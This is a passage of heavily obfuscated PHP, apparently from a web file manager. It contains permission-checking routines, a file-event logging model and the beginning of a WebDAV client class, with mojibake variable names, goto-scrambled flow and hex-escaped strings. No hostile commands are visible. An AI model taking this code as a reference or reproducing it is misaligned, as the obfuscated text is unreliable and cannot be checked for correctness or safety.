if ($Dò•ñ‡¢êÄ) { $bÈË ÅßÅ = array($f·¿Ø¿›Ø[2169] => intval($Dò•ñ‡¢êÄ[$f·¿Ø¿›Ø[373]][$f·¿Ø¿›Ø[373]]), $f·¿Ø¿›Ø[2170] => $Dò•ñ‡¢êÄ[$f·¿Ø¿›Ø[373]]); } } if ((!$bÈË ÅßÅ || $bÈË ÅßÅ[$f·¿Ø¿›Ø[374]] <= 0) && $d°„„¸¿®Â[$f·¿Ø¿›Ø[368]] == SourceModel::TYPE_GROUP) { $bÈË ÅßÅ = $this->authDeepCheck($d°„„¸¿®Â[$f·¿Ø¿›Ø[366]], $bÈË ÅßÅ); } return $bÈË ÅßÅ; goto AÜœ°­¸ã«; Dã‹á†‚˜: $d¸Éª¬„Å = array_merge(array($d°„„¸¿®Â[$f·¿Ø¿›Ø[366]]), array_reverse($d¸Éª¬„Å)); $bÈË ÅßÅ = !1; foreach ($d¸Éª¬„Å as $eö£§¶ÕÓ‰) { if (!isset($AÚ¯ØƒÛŒ[$eö£§¶ÕÓ‰])) { continue; } $B„¿º¥Â = $this->authMake($AÚ¯ØƒÛŒ[$eö£§¶ÕÓ‰]); if ($B„¿º¥Â[$f·¿Ø¿›Ø[414]]) { $bÈË ÅßÅ = $B„¿º¥Â; break; } } goto bŠÃŸË»÷; c¬ÈĞİÃëÌ: $f·¿Ø¿›Ø =& $_SERVER[¿õñ]; $fÍ†™ÁÜ¹‰ = Session::get($f·¿Ø¿›Ø[2128]); $d¸Éª¬„Å = Model($f·¿Ø¿›Ø[1087])->parentLevelArray($d°„„¸¿®Â[$f·¿Ø¿›Ø[455]]); goto Dã‹á†‚˜; AÜœ°­¸ã«: } public function authOwnerApply($eòÇ˜Û¦á¿) { goto F‚ —”¬í; b’¿¢Á¨: $eòÇ˜Û¦á¿[$A¥•ïß‚·[373]][$A¥•ïß‚·[2173]] = Model($A¥•ïß‚·[466])->userListInfo($D»©éÓç ); return $eòÇ˜Û¦á¿; goto dÚ ¢à“îì; b‚¿ƒ¥ñˆ: $AÖîêº—‹Å = array(); $D»©éÓç  = array(); foreach ($EçÄºÚ‰àŞ as $C‡öéÑ÷” => $E§ŞÒöìÄà) { $C–ç³ğÀŠ„ = $this->authFolderOwnerUser($E§ŞÒöìÄà); $AÖîêº—‹Å[$C‡öéÑ÷”] = $C–ç³ğÀŠ„; $D»©éÓç  = array_merge($D»©éÓç , $C–ç³ğÀŠ„[$A¥•ïß‚·[527]]); if ($C–ç³ğÀŠ„[$A¥•ïß‚·[2172]]) { break; } } goto CáŠ„š«‹”; CáŠ„š«‹”: if (count($D»©éÓç ) == 0) { $D»©éÓç  = $this->authFolderOwnerGroup($eòÇ˜Û¦á¿[$A¥•ïß‚·[452]]); } $D»©éÓç  = array_unique($D»©éÓç ); if (AuthModel::authCheckRoot($eòÇ˜Û¦á¿[$A¥•ïß‚·[373]][$A¥•ïß‚·[374]])) { $D»©éÓç [] = USER_ID; } goto b’¿¢Á¨; D÷îø•Ğ¯: $C¨’İŞŠŞÛ = array($A¥•ïß‚·[380] => array($A¥•ïß‚·[381], $e©„¤·‹Šî)); $EçÄºÚ‰àŞ = $this->field($F¥ö¢ôŠÜĞ)->where($C¨’İŞŠŞÛ)->select(); $EçÄºÚ‰àŞ = array_to_keyvalue_group($EçÄºÚ‰àŞ, $A¥•ïß‚·[366]); goto b‚¿ƒ¥ñˆ; F‚ —”¬í: $A¥•ïß‚· =& $_SERVER[¿õñ]; if (!$eòÇ˜Û¦á¿[$A¥•ïß‚·[373]] || $eòÇ˜Û¦á¿[$A¥•ïß‚·[2171]]) { return $eòÇ˜Û¦á¿; } if (AuthModel::authCheckRoot($eòÇ˜Û¦á¿[$A¥•ïß‚·[373]][$A¥•ïß‚·[374]])) { return $eòÇ˜Û¦á¿; } goto eÚÃÎÓºÄ; eÚÃÎÓºÄ: $e©„¤·‹Šî = Model($A¥•ïß‚·[1087])->parentLevelArray($eòÇ˜Û¦á¿[$A¥•ïß‚·[455]]); $e©„¤·‹Šî = array_merge(array($eòÇ˜Û¦á¿[$A¥•ïß‚·[366]]), array_reverse($e©„¤·‹Šî)); $F¥ö¢ôŠÜĞ = $A¥•ïß‚·[2163]; goto D÷îø•Ğ¯; dÚ ¢à“îì: } private function authFolderOwnerGroup($ağ·ÎáŠÜŒ) { $aÉ×­à¢õ =& $_SERVER[¿õñ]; $E¯Ú†˜‰Ñé = Model($aÉ×­à¢õ[2090])->where(array($aÉ×­à¢õ[2013] => $ağ·ÎáŠÜŒ))->select(); $Eİ…®ÄŞó² = array(); if (!$E¯Ú†˜‰Ñé) { return $Eİ…®ÄŞó²; } foreach ($E¯Ú†˜‰Ñé as $eÁÔÜ„Š) { $E–‹³Í÷» = $this->authInfo($eÁÔÜ„Š); if (AuthModel::authCheckRoot($E–‹³Í÷»[$aÉ×­à¢õ[373]])) { $Eİ…®ÄŞó²[] = $eÁÔÜ„Š[$aÉ×­à¢õ[1350]]; } } return $Eİ…®ÄŞó²; } private function authFolderOwnerUser($e„¦ÙÙñØ) { $FœĞ Ã¤ =& $_SERVER[¿õñ]; $dÅ©¡Á¤Ô’ = array(); $b£ê›¹› = !1; foreach ($e„¦ÙÙñØ as $bÎÄŠƒÊí³) { $BòÎ£ë§Ô = $this->authInfo($bÎÄŠƒÊí³); if ($bÎÄŠƒÊí³[$FœĞ Ã¤[452]] == $FœĞ Ã¤[464]) { $b£ê›¹› = !0; } if ($bÎÄŠƒÊí³[$FœĞ Ã¤[368]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($BòÎ£ë§Ô[$FœĞ Ã¤[373]])) { $dÅ©¡Á¤Ô’[] = $bÎÄŠƒÊí³[$FœĞ Ã¤[452]]; } } } return array($FœĞ Ã¤[527] => $dÅ©¡Á¤Ô’, $FœĞ Ã¤[2172] => $b£ê›¹›); } public function authMake($BÀ¶Ş¼Ô³É) { goto a±±·¨ĞÒ; a±±·¨ĞÒ: $dÜÀëÜËñà =& $_SERVER[¿õñ]; if (!$BÀ¶Ş¼Ô³É) { return array($dÜÀëÜËñà[374] => 0, $dÜÀëÜËñà[414] => !1); } $Ağ„İ‡˜ö” = Session::get($dÜÀëÜËñà[2128]); goto D¶ÔøåÃ©; D¶ÔøåÃ©: $dÚ»¡ ¼¬ = array_to_keyvalue($Ağ„İ‡˜ö”, $dÜÀëÜËñà[33], $dÜÀëÜËñà[2013]); $d³‹—ë½Ù¨ = 0; $D«†í™Ş = 0; goto FéÎœåø¥Î; b°‚ƒ£Ñ•: $Dã¼ËÆ±¬¡ = 0; $b”É‡éÙ¾Ñ = 0; $d·âĞ‘ŸÒ = 0; goto aïæ‰™²¢×; aïæ‰™²¢×: $F¤·ô›§Ì„ = 0; foreach ($BÀ¶Ş¼Ô³É as $A‹×äåˆäë) { $døØ‡‡×Ã = $this->authInfo($A‹×äåˆäë); $F¨šÙÂ†Ç“ = $A‹×äåˆäë[$dÜÀëÜËñà[452]]; $c×Š´ÚòÏŞ = intval($døØ‡‡×Ã[$dÜÀëÜËñà[373]]); if ($A‹×äåˆäë[$dÜÀëÜËñà[368]] == SourceModel::TYPE_USER && $F¨šÙÂ†Ç“ == USER_ID) { $b”É‡éÙ¾Ñ = !0; $aƒİÃ¤¦Ï¤ = $døØ‡‡×Ã; $d³‹—ë½Ù¨ = $c×Š´ÚòÏŞ; } else { if ($A‹×äåˆäë[$dÜÀëÜËñà[368]] == SourceModel::TYPE_GROUP && in_array($F¨šÙÂ†Ç“, $dÚ»¡ ¼¬)) { $d·âĞ‘ŸÒ = !0; if ($c×Š´ÚòÏŞ >= $D«†í™Ş) { $D«†í™Ş = $c×Š´ÚòÏŞ; $Aß†áŠØŠ = $døØ‡‡×Ã; } } else { if ($F¨šÙÂ†Ç“ == 0) { $F¤·ô›§Ì„ = !0; $Dã¼ËÆ±¬¡ = $døØ‡‡×Ã; $FÕ‰ÎïŸ”Ÿ = $c×Š´ÚòÏŞ; } } } } $c‚¸ºš…ªØ = $b”É‡éÙ¾Ñ ? $d³‹—ë½Ù¨ : ($d·âĞ‘ŸÒ ? $D«†í™Ş : $FÕ‰ÎïŸ”Ÿ); goto D•¾­±»™Ä; FéÎœåø¥Î: $FÕ‰ÎïŸ”Ÿ = 0; $aƒİÃ¤¦Ï¤ = 0; $Aß†áŠØŠ = 0; goto b°‚ƒ£Ñ•; D•¾­±»™Ä: $døØ‡‡×Ã = $b”É‡éÙ¾Ñ ? $aƒİÃ¤¦Ï¤ : ($d·âĞ‘ŸÒ ? $Aß†áŠØŠ : $Dã¼ËÆ±¬¡); $EçÔ»†™•À = array($dÜÀëÜËñà[2169] => intval($c‚¸ºš…ªØ), $dÜÀëÜËñà[2170] => $døØ‡‡×Ã); return $EçÔ»†™•À; goto Dó„ä ™ÔÉ; Dó„ä ™ÔÉ: } public function authTargetInfoMake($aÑ´áÆ‹è¯) { goto e ËÃ¶‚‰Â; e ËÃ¶‚‰Â: $E†°˜¾È˜ =& $_SERVER[¿õñ]; $c­Ù•öŒ„š = array(); $C“ˆç°„õÌ = array(); goto B¾ğğÌ’í•; E×ïÛ×ğ–°: return array($E†°˜¾È˜[2174] => $c­Ù•öŒ„š, $E†°˜¾È˜[2175] => $C“ˆç°„õÌ); goto bÊá®¼†œ„; B¾ğğÌ’í•: foreach ($aÑ´áÆ‹è¯ as $bÌ§‚ê¥ô) { if ($bÌ§‚ê¥ô[$E†°˜¾È˜[368]] == SourceModel::TYPE_USER) { $c­Ù•öŒ„š[] = intval($bÌ§‚ê¥ô[$E†°˜¾È˜[452]]); } else { if ($bÌ§‚ê¥ô[$E†°˜¾È˜[368]] == SourceModel::TYPE_GROUP) { $C“ˆç°„õÌ[] = intval($bÌ§‚ê¥ô[$E†°˜¾È˜[452]]); } } } if ($c­Ù•öŒ„š) { $c­Ù•öŒ„š = Model($E†°˜¾È˜[466])->userListInfo($c­Ù•öŒ„š); } if ($C“ˆç°„õÌ) { $b‰ï‚‡ÚŸ = array($E†°˜¾È˜[2088] => array($E†°˜¾È˜[381], $C“ˆç°„õÌ)); $C“ˆç°„õÌ = Model($E†°˜¾È˜[454])->field($E†°˜¾È˜[2101])->where($b‰ï‚‡ÚŸ)->select(); $C“ˆç°„õÌ = array_to_keyvalue($C“ˆç°„õÌ, $E†°˜¾È˜[2013]); } goto E×ïÛ×ğ–°; bÊá®¼†œ„: } private function authInfo($bôÌë¿„ô—) { $bÁŸìÇÔŠå =& $_SERVER[¿õñ]; if ($bôÌë¿„ô—[$bÁŸìÇÔŠå[2144]]) { $bœ£ïŒ’—Ô = Model($bÁŸìÇÔŠå[2160])->listData($bôÌë¿„ô—[$bÁŸìÇÔŠå[2144]]); if (!$bœ£ïŒ’—Ô) { return !1; $céø›îŒ¾Æ = Model($bÁŸìÇÔŠå[2160])->listData(); $F³º©É†ÂŸ = array_filter_by_field($céø›îŒ¾Æ, $bÁŸìÇÔŠå[373], $bÁŸìÇÔŠå[464]); return $F³º©É†ÂŸ; } $A™’Šï°„Û = array_field_key($bœ£ïŒ’—Ô, array($bÁŸìÇÔŠå[364], $bÁŸìÇÔŠå[28], $bÁŸìÇÔŠå[373], $bÁŸìÇÔŠå[2031], $bÁŸìÇÔŠå[2034])); $A™’Šï°„Û[$bÁŸìÇÔŠå[2176]] = $bôÌë¿„ô—; return $A™’Šï°„Û; } else { return array($bÁŸìÇÔŠå[382] => 0, $bÁŸìÇÔŠå[2019] => $bôÌë¿„ô—[$bÁŸìÇÔŠå[2145]], $bÁŸìÇÔŠå[383] => $bÁŸìÇÔŠå[33], $bÁŸìÇÔŠå[2031] => $bÁŸìÇÔŠå[2177]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\162\x63\145\x5f\145\166\x65\156\x74"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\x73\x65\162\164", "\146\x75\156\143\164\x69\157\x6e"), array("\144\x65\163\143", '', "\151\x6e\x73\x65\162\164\54\165\160\144\141\164\145\x2c\x73\x65\x6c\145\143\x74", "\x6a\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($eÙİ¢çƒ«Š, $fÍ©°¤À”¹, $a±ËÌ†‰‚ = '') { goto aÚ´¯òóÔ; a’Ëùºê‚: $A”âŠÇï = array($bç“„µë›Œ[380] => $eÙİ¢çƒ«Š, $bç“„µë›Œ[2178] => $E®íÔ¿ÜîØ[$bç“„µë›Œ[457]], $bç“„µë›Œ[2179] => $E®íÔ¿ÜîØ[$bç“„µë›Œ[28]], $bç“„µë›Œ[462] => $E®íÔ¿ÜîØ[$bç“„µë›Œ[462]], $bç“„µë›Œ[1341] => USER_ID, $bç“„µë›Œ[385] => $fÍ©°¤À”¹, $bç“„µë›Œ[1343] => $a±ËÌ†‰‚); $this->addSystemLog($fÍ©°¤À”¹, $A”âŠÇï); return $this->add($A”âŠÇï); goto AéÔêˆ¨®½; EÒ…»ÁôÀ: if (!$E®íÔ¿ÜîØ) { return !1; } if ($this->isCacheEvent($E®íÔ¿ÜîØ, $fÍ©°¤À”¹)) { return; } if ($a±ËÌ†‰‚ && is_string($a±ËÌ†‰‚)) { $a±ËÌ†‰‚ = array($bç“„µë›Œ[2044] => $a±ËÌ†‰‚); } goto a’Ëùºê‚; aÚ´¯òóÔ: $bç“„µë›Œ =& $_SERVER[¿õñ]; if (!$this->eventSave) { return; } $E®íÔ¿ÜîØ = Model($bç“„µë›Œ[1087])->sourceInfo($eÙİ¢çƒ«Š); goto EÒ…»ÁôÀ; AéÔêˆ¨®½: } private function addSystemLog($fğ®ê†ª•ß, $dè°ñÕäË) { $eøÁÆÕ°² =& $_SERVER[¿õñ]; if ($fğ®ê†ª•ß == $eøÁÆÕ°²[2180]) { $fğ®ê†ª•ß = $dè°ñÕäË[$eøÁÆÕ°²[401]][$eøÁÆÕ°²[2181]]; } else { if (in_array($fğ®ê†ª•ß, array($eøÁÆÕ°²[1990], $eøÁÆÕ°²[2182]))) { $fğ®ê†ª•ß = $dè°ñÕäË[$eøÁÆÕ°²[401]][$eøÁÆÕ°²[689]]; } } $cò¥¸–¯ÇÕ = array_merge($dè°ñÕäË, array($eøÁÆÕ°²[2183] => $dè°ñÕäË[$eøÁÆÕ°²[366]], $eøÁÆÕ°²[2184] => $dè°ñÕäË[$eøÁÆÕ°²[2184]])); Model($eøÁÆÕ°²[1955])->addLog($eøÁÆÕ°²[2185] . $fğ®ê†ª•ß, $cò¥¸–¯ÇÕ); } private function isCacheEvent($eÀš‡ ¥õÕ, $C•‹õºİ¬æ) { if ($eÀš‡ ¥õÕ[$_SERVER[¿õñ][368]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($bÒçªÖ¦, $e±¹•óÑŸº) { $C×ØíÁÄÂ =& $_SERVER[¿õñ]; $D±÷–œÓ‚ = Model($C×ØíÁÄÂ[1087])->sourceInfo($bÒçªÖ¦); $BŠàŸìÍïŸ = array($C×ØíÁÄÂ[2181] => $e±¹•óÑŸº, $C×ØíÁÄÂ[28] => $D±÷–œÓ‚[$C×ØíÁÄÂ[28]]); return $this->addEvent($bÒçªÖ¦, $C×ØíÁÄÂ[2180], $BŠàŸìÍïŸ); } public function eventFileEdit($f³÷¨‰ÑÌ£) { $aÚ¢ÆªÔæî =& $_SERVER[¿õñ]; $dçËÃ†ÑÄˆ = array($aÚ¢ÆªÔæî[2186] => $_SERVER[$aÚ¢ÆªÔæî[2187]], $aÚ¢ÆªÔæî[1658] => strtolower(ACTION)); return $this->addEvent($f³÷¨‰ÑÌ£, $aÚ¢ÆªÔæî[1982], $dçËÃ†ÑÄˆ); } public function eventRecycle($f¨Š®ÚÕÙ, $DñàÈä­£¼) { return $this->addEvent($f¨Š®ÚÕÙ, $_SERVER[¿õñ][2182], $DñàÈä­£¼); } public function eventRemove($EÅîÀ…¯ª ) { $B ŒØ›Ä‰ì =& $_SERVER[¿õñ]; $E¯—½—æ¹á = Model($B ŒØ›Ä‰ì[1087])->sourceInfo($EÅîÀ…¯ª ); $f™¼Äóí—‘ = $E¯—½—æ¹á[$B ŒØ›Ä‰ì[28]]; return $this->addEvent($E¯—½—æ¹á[$B ŒØ›Ä‰ì[457]], $B ŒØ›Ä‰ì[1981], $f™¼Äóí—‘); } public function eventShare($cà‘×ŒñÁ, $Dˆ¯ÑœÙŞ) { return $this->addEvent($cà‘×ŒñÁ, $_SERVER[¿õñ][1990], $Dˆ¯ÑœÙŞ); } public function eventMove($c ƒğÀß±º, $b„ÍÍÏ˜•, $b³ØåÙÚ›Ê) { goto c†£¤¢Ïò; fò´‹Í†®ç: $this->addEvent($b„ÍÍÏ˜•, $C©…óÑçŒÄ[2192], $F£¯¤ÕÂÆ); goto F±•ÑÓ ; Dê…‹«çï«: $B¶¤Ú›„¥ = $F†º’Êí˜¹->sourceInfo($b„ÍÍÏ˜•); $aˆ¶‹äˆªé = $F†º’Êí˜¹->sourceInfo($b³ØåÙÚ›Ê); $F£¯¤ÕÂÆ = array($C©…óÑçŒÄ[990] => $b„ÍÍÏ˜•, $C©…óÑçŒÄ[2188] => $B¶¤Ú›„¥[$C©…óÑçŒÄ[28]], $C©…óÑçŒÄ[2189] => $B¶¤Ú›„¥[$C©…óÑçŒÄ[462]], $C©…óÑçŒÄ[991] => $b³ØåÙÚ›Ê, $C©…óÑçŒÄ[2190] => $aˆ¶‹äˆªé[$C©…óÑçŒÄ[28]], $C©…óÑçŒÄ[2191] => $aˆ¶‹äˆªé[$C©…óÑçŒÄ[462]]); goto BìÄ™·; c†£¤¢Ïò: $C©…óÑçŒÄ =& $_SERVER[¿õñ]; $F†º’Êí˜¹ = Model($C©…óÑçŒÄ[1087]); $D‰µŒ½·ğ = $F†º’Êí˜¹->sourceInfo($c ƒğÀß±º); goto Dê…‹«çï«; BìÄ™·: $this->addEvent($c ƒğÀß±º, $C©…óÑçŒÄ[484], $F£¯¤ÕÂÆ); $D‰µŒ½·ğ = $F†º’Êí˜¹->sourceInfo($c ƒğÀß±º); $F£¯¤ÕÂÆ = array($C©…óÑçŒÄ[366] => $D‰µŒ½·ğ[$C©…óÑçŒÄ[366]], $C©…óÑçŒÄ[28] => $D‰µŒ½·ğ[$C©…óÑçŒÄ[28]]); goto fò´‹Í†®ç; F±•ÑÓ : } public function eventCopy($aÜ¿¾ñ×Ì) { $this->eventCreate($aÜ¿¾ñ×Ì, $_SERVER[¿õñ][482]); } public function eventRename($fù¾Ë‹¿Î, $bãÆÜ‰Á©, $aÀŒ‡¼Â ø) { $FÖÒº»ø…ˆ =& $_SERVER[¿õñ]; $bğí¯°±å = array($FÖÒº»ø…ˆ[990] => $bãÆÜ‰Á©, $FÖÒº»ø…ˆ[991] => $aÀŒ‡¼Â ø); return $this->addEvent($fù¾Ë‹¿Î, $FÖÒº»ø…ˆ[1099], $bğí¯°±å); } public function eventAddComment($C„¼Ñğçœ, $A÷ğØà¤¦½) { return $this->addEvent($C„¼Ñğçœ, $_SERVER[¿õñ][2193], $A÷ğØà¤¦½); } public function eventAddDesc($dÎˆƒá°½Ö, $C²¾öâ°Ô„) { return $this->addEvent($dÎˆƒá°½Ö, $_SERVER[¿õñ][2194], $C²¾öâ°Ô„); } public function listBySource($b¼ñìœÊ¶®) { goto e‹ƒ©¹ÀÖÇ; e‹ƒ©¹ÀÖÇ: $FµÅ¡£×ò— =& $_SERVER[¿õñ]; $dèŸôŞ­ˆÀ = Model($FµÅ¡£×ò—[1087])->sourceInfo($b¼ñìœÊ¶®); $FÛÙ§²¥‡ = array($FµÅ¡£×ò—[380] => $b¼ñìœÊ¶®); goto a¸Å‘ª¥Á—; a¸Å‘ª¥Á—: if ($dèŸôŞ­ˆÀ[$FµÅ¡£×ò—[367]] == $FµÅ¡£×ò—[493]) { $A¹µÜª¡ø = Model($FµÅ¡£×ò—[1087])->listSearchChildren($b¼ñìœÊ¶®, 20000); $A¹µÜª¡ø[] = $b¼ñìœÊ¶® . $FµÅ¡£×ò—[358]; $FÛÙ§²¥‡ = array($FµÅ¡£×ò—[366] => array($FµÅ¡£×ò—[7], $A¹µÜª¡ø)); } $bÑĞËá‘„ = $this->where($FÛÙ§²¥‡)->order($FµÅ¡£×ò—[2195])->selectPage(); if ($bÑĞËá‘„[$FµÅ¡£×ò—[347]][$FµÅ¡£×ò—[348]] == 0) { $bÑĞËá‘„[$FµÅ¡£×ò—[347]][$FµÅ¡£×ò—[348]] = 1; $bÑĞËá‘„[$FµÅ¡£×ò—[350]] = array(array($FµÅ¡£×ò—[380] => $b¼ñìœÊ¶®, $FµÅ¡£×ò—[2178] => $dèŸôŞ­ˆÀ[$FµÅ¡£×ò—[457]], $FµÅ¡£×ò—[1341] => $dèŸôŞ­ˆÀ[$FµÅ¡£×ò—[375]], $FµÅ¡£×ò—[385] => $FµÅ¡£×ò—[2196], $FµÅ¡£×ò—[386] => $dèŸôŞ­ˆÀ[$FµÅ¡£×ò—[184]], $FµÅ¡£×ò—[1343] => $FµÅ¡£×ò—[33])); } goto d“¢ã®«»¶; d“¢ã®«»¶: $bÑĞËá‘„ = $this->eventListParse($bÑĞËá‘„, $b¼ñìœÊ¶®); show_json($bÑĞËá‘„); goto cªîÉ›íãÆ; cªîÉ›íãÆ: } private function eventListParse($B˜‘º‚ª”Œ, $aßÁâó Ç«) { goto D¿‹Œï˜Š½; A«ğëÑ÷¹»: $B½õÓ°À˜ = array_to_keyvalue($E¥´½…ïî, $Cî„Á´°Ô¹[33], $Cî„Á´°Ô¹[2184]); foreach ($E¥´½…ïî as $b¼î™†ã‚Ê) { $EˆêÓ›‡•å = $b¼î™†ã‚Ê[$Cî„Á´°Ô¹[401]]; if ($b¼î™†ã‚Ê[$Cî„Á´°Ô¹[29]] == $Cî„Á´°Ô¹[484] && isset($EˆêÓ›‡•å[$Cî„Á´°Ô¹[990]])) { $Aáñòä’¬[] = $EˆêÓ›‡•å[$Cî„Á´°Ô¹[990]] . $Cî„Á´°Ô¹[33]; $Aáñòä’¬[] = $EˆêÓ›‡•å[$Cî„Á´°Ô¹[991]] . $Cî„Á´°Ô¹[33]; } if ($b¼î™†ã‚Ê[$Cî„Á´°Ô¹[29]] == $Cî„Á´°Ô¹[2192] && isset($EˆêÓ›‡•å[$Cî„Á´°Ô¹[366]])) { $Aáñòä’¬[] = $EˆêÓ›‡•å[$Cî„Á´°Ô¹[366]] . $Cî„Á´°Ô¹[33]; } } $Aáñòä’¬ = array_merge($Aáñòä’¬, $B½õÓ°À˜, array($aßÁâó Ç« . $Cî„Á´°Ô¹[33])); goto có·åÏå®; d—¼ÃÛÑ¥Ì: return $B˜‘º‚ª”Œ; goto E‡‘šìš; D¿‹Œï˜Š½: $Cî„Á´°Ô¹ =& $_SERVER[¿õñ]; $E¥´½…ïî = $B˜‘º‚ª”Œ[$Cî„Á´°Ô¹[350]]; $Aáñòä’¬ = array_to_keyvalue($E¥´½…ïî, $Cî„Á´°Ô¹[33], $Cî„Á´°Ô¹[366]); goto A«ğëÑ÷¹»; A¶öÏÍ‹Ò: $dìù¤¶·²ƒ = Model($Cî„Á´°Ô¹[759])->sourceListInfo($Aáñòä’¬, !0); foreach ($E¥´½…ïî as &$b¼î™†ã‚Ê) { goto cÜù‹ï™Ô; dÃÑ‡¤¦¹³: $b¼î™†ã‚Ê[$Cî„Á´°Ô¹[388]] = $dìù¤¶·²ƒ[$b¼î™†ã‚Ê[$Cî„Á´°Ô¹[366]]]; $b¼î™†ã‚Ê[$Cî„Á´°Ô¹[2197]] = $dìù¤¶·²ƒ[$b¼î™†ã‚Ê[$Cî„Á´°Ô¹[2184]]]; if ($b¼î™†ã‚Ê[$Cî„Á´°Ô¹[29]] == $Cî„Á´°Ô¹[1981]) { $b¼î™†ã‚Ê[$Cî„Á´°Ô¹[2197]] = $b¼î™†ã‚Ê[$Cî„Á´°Ô¹[388]]; $b¼î™†ã‚Ê[$Cî„Á´°Ô¹[2184]] = $b¼î™†ã‚Ê[$Cî„Á´°Ô¹[2197]][$Cî„Á´°Ô¹[366]]; $b¼î™†ã‚Ê[$Cî„Á´°Ô¹[388]] = !1; $b¼î™†ã‚Ê[$Cî„Á´°Ô¹[366]] = $Cî„Á´°Ô¹[33]; } goto bÔƒ‡ÊÉ¦¯; bÔƒ‡ÊÉ¦¯: $b¼î™†ã‚Ê[$Cî„Á´°Ô¹[2149]] = $f±Ï¸Ç˜ä[$b¼î™†ã‚Ê[$Cî„Á´°Ô¹[1350]]]; goto bÃÊ‡ëİì†; cÜù‹ï™Ô: $EˆêÓ›‡•å =& $b¼î™†ã‚Ê[$Cî„Á´°Ô¹[401]]; if ($b¼î™†ã‚Ê[$Cî„Á´°Ô¹[29]] == $Cî„Á´°Ô¹[484] && isset($EˆêÓ›‡•å[$Cî„Á´°Ô¹[990]])) { $EˆêÓ›‡•å[$Cî„Á´°Ô¹[990]] = $dìù¤¶·²ƒ[$EˆêÓ›‡•å[$Cî„Á´°Ô¹[990]]]; $EˆêÓ›‡•å[$Cî„Á´°Ô¹[991]] = $dìù¤¶·²ƒ[$EˆêÓ›‡•å[$Cî„Á´°Ô¹[991]]]; } if ($b¼î™†ã‚Ê[$Cî„Á´°Ô¹[29]] == $Cî„Á´°Ô¹[2192] && isset($EˆêÓ›‡•å[$Cî„Á´°Ô¹[366]])) { $EˆêÓ›‡•å[$Cî„Á´°Ô¹[366]] = $dìù¤¶·²ƒ[$EˆêÓ›‡•å[$Cî„Á´°Ô¹[366]]]; } goto dÃÑ‡¤¦¹³; bÃÊ‡ëİì†: } $B˜‘º‚ª”Œ[$Cî„Á´°Ô¹[350]] = $E¥´½…ïî; goto d—¼ÃÛÑ¥Ì; có·åÏå®: $Aáñòä’¬ = array_unique($Aáñòä’¬); $Bß„Ç¯ Áè = array_unique(array_to_keyvalue($E¥´½…ïî, $Cî„Á´°Ô¹[33], $Cî„Á´°Ô¹[1350])); $f±Ï¸Ç˜ä = Model($Cî„Á´°Ô¹[469])->userListInfo($Bß„Ç¯ Áè); goto A¶öÏÍ‹Ò; E‡‘šìš: } public function removeBySource($C½”Ö¹âšÑ) { $cí¦³¬ì¡” = array($_SERVER[¿õñ][380] => $C½”Ö¹âšÑ); $this->where($cí¦³¬ì¡”)->remove(); } } goto EÑĞ¢¡ğò¡; C¾†ÅÀ—Ãè: class HttpDavClient { public function __construct($eÑÙºÀ¸çì, $AñÕ÷–‚àÏ, $b²Òâ‡ÂÖ…) { $this->header = array(); $this->userName = $AñÕ÷–‚àÏ; $this->userPassowrd = $b²Òâ‡ÂÖ…; } protected function makePath($cˆ¿‰›‰ÜŸ) { return $cˆ¿‰›‰ÜŸ; } protected function setHeader($B´õà·Ü˜¤, $E•·ò‚òÅÂ = false) { if ($E•·ò‚òÅÂ === !1) { $this->header[] = $B´õà·Ü˜¤; } else { $this->header[] = $B´õà·Ü˜¤ . $_SERVER[¿õñ][887] . $E•·ò‚òÅÂ; } } public function move($e¢Œ•¿òğ, $E‹ÊÂĞÇ’¹, $FĞ¤õÊ¤ô· = '') { $díÉÀ±²ÍÆ =& $_SERVER[¿õñ]; $this->setHeader($díÉÀ±²ÍÆ[1677], $this->makePath($E‹ÊÂĞÇ’¹)); $this->setHeader($díÉÀ±²ÍÆ[1678], $díÉÀ±²ÍÆ[1679]); if ($FĞ¤õÊ¤ô·) { $this->setHeader($díÉÀ±²ÍÆ[1680], $díÉÀ±²ÍÆ[932] . $FĞ¤õÊ¤ô· . $díÉÀ±²ÍÆ[935]); } return $this->send($díÉÀ±²ÍÆ[1681], $e¢Œ•¿òğ); } public function copy($e‡…àù’Ø, $FÈ²ğê××) { $C‰ç­¡ß„ =& $_SERVER[¿õñ]; $this->setHeader($C‰ç­¡ß„[1677], $this->makePath($FÈ²ğê××)); $this->setHeader($C‰ç­¡ß„[1678], $C‰ç­¡ß„[1679]); return $this->send($C‰ç­¡ß„[1682], $e‡…àù’Ø); } public function mkcol($bÊÛŸÜÇ”) { $EçÂÖç›Ó =& $_SERVER[¿õñ]; $this->setHeader($EçÂÖç›Ó[1678], $EçÂÖç›Ó[1679]); return $this->send($EçÂÖç›Ó[1683], $bÊÛŸÜÇ”); } public function delete($e×ï…ÈÚÛ…, $CÃóÜ„Æç = '') { $AÇ˜îøÊÎ¬ =& $_SERVER[¿õñ]; if ($CÃóÜ„Æç) { $this->setHeader($AÇ˜îøÊÎ¬[1680], $AÇ˜îøÊÎ¬[932] . $CÃóÜ„Æç . $AÇ˜îøÊÎ¬[935]); } return $this->send($AÇ˜îøÊÎ¬[1684], $e×ï…ÈÚÛ…); } public function propfind($a„§‡ğãø¡) { $fÔèŒï‰ß² =& $_SERVER[¿õñ]; $this->setHeader($fÔèŒï‰ß²[1685], $fÔèŒï‰ß²[493]); $this->setHeader($fÔèŒï‰ß²[1686], $fÔèŒï‰ß²[1687]); $EËÈîÕÓ³Ô = $fÔèŒï‰ß²[1688]; return $this->send($fÔèŒï‰ß²[1689], $a„§‡ğãø¡, $EËÈîÕÓ³Ô); } public function options($C¦®È­Äë) { return $this->send($_SERVER[¿õñ][1690], $C¦®È­Äë); } public function get($FŞ‹É”»Ê¨) { return $this->send($_SERVER[¿õñ][213], $FŞ‹É”»Ê¨); } public function put($aØÏŞÈñ¾ì, $eÃ‰ê˜Ì­–, $Cî‰™‹¸Â‡ = '') { $bˆÛÁ»±áÚ =& $_SERVER[¿õñ]; if ($Cî‰™‹¸Â‡) { $this->setHeader($bˆÛÁ»±áÚ[1680], $bˆÛÁ»±áÚ[932] . $Cî‰™‹¸Â‡ . $bˆÛÁ»±áÚ[935]); } return 